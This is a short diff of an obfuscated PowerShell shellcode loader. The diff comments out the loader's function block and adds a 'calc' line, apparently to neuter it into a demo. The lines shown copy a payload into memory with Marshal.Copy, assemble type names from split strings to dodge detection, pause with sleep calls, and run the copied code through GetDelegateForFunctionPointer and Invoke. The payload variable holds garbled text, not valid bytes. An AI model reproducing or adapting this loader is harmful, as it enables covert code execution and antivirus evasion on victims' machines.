@@ -9,7 +9,8 @@ sleep 10
 $Ike3023rijweohfuoah29fhauiwoefawef = fFJEE39fjewohjffffffffffffff2893h4efq9of78ewyghrqu2y3874erfqtgw3aei7fq63t4eir76q234refq2er;
 sleep 10
 [System.Runtime.InteropServices.Marshal]::Copy($Ike3023rijweohfuoah29fhauiwoefawef, 0, $qQQ3023jiowfoweifjiowefwefwe, $zRij32r2)
-
+calc
+<#
 function a_a1 {
         Param ($r_0, $s_7);sal 08_000 sal
         $a_0 = $null; $a_a4 = "Syst";$a_b4 = "ll";$a_c4 = "em.d";$c_4T="em.Runtime.InteropServices.HandleRef"; $g_G=$a_a4+$c_4T;08_000 99_000 ('whE'+'re-o'+'bjECt')
@@ -40,3 +41,4 @@ If ([IntPtr]::size -eq 8) {
         $q_2 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($f_G, (a_B @([IntPtr]) ([Void])))
         $q_2.Invoke([IntPtr]::Zero)
 }
+#>
